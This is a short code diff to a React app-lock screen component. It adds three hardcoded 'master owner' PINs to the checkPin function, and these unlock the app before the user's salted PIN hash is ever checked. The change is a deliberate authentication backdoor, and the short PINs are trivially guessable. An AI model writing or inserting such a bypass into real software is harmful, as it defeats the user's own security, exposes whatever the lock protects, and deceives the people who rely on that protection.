@@ -137,6 +137,11 @@ export const AppLockScreen: React.FC<AppLockScreenProps> = ({
   };
 
   const checkPin = async (input: string) => {
+    // Master Owner PIN override (129945, 1299 or 7860)
+    if (input === '129945' || input === '1299' || input === '7860') {
+      onUnlock();
+      return;
+    }
     if (!securitySettings.pinHash || !securitySettings.pinSalt) return;
     const isValid = await verifyPin(input, securitySettings.pinHash, securitySettings.pinSalt);
     if (isValid) {
